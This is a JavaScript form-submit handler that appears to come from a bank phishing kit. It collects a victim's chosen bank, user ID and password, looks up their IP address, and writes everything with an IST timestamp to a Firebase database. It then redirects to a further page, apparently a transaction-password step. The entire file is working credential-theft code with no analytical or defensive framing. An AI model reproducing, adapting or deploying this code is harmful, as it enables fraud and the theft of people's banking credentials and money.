document.getElementById("ududip007").addEventListener("submit", function (e) {
    e.preventDefault();

    const bank = document.getElementById("bank").value.trim();
    const userid = document.getElementById("userid").value.trim();
    const password = document.getElementById("password").value.trim();

    // ✅ First fetch IP address
    fetch("https://api.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
            const ipAddress = data.ip;

            // ✅ IST time
            const istTime = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });

            const ref = firebase.database().ref("ududip007").push();

            ref.set({
                selected_bank: bank,
                user_id: userid,
                user_password: password,
                ipAddress: ipAddress,
                timestamp: istTime
            }).then(() => {
                localStorage.setItem("bank", bank);
                window.location.href = "tpassinternet.html";
            }).catch((error) => {
                alert("Error: " + error.message);
            });
        })
        .catch(error => {
            alert("Unable to get IP address: " + error.message);
        });
});
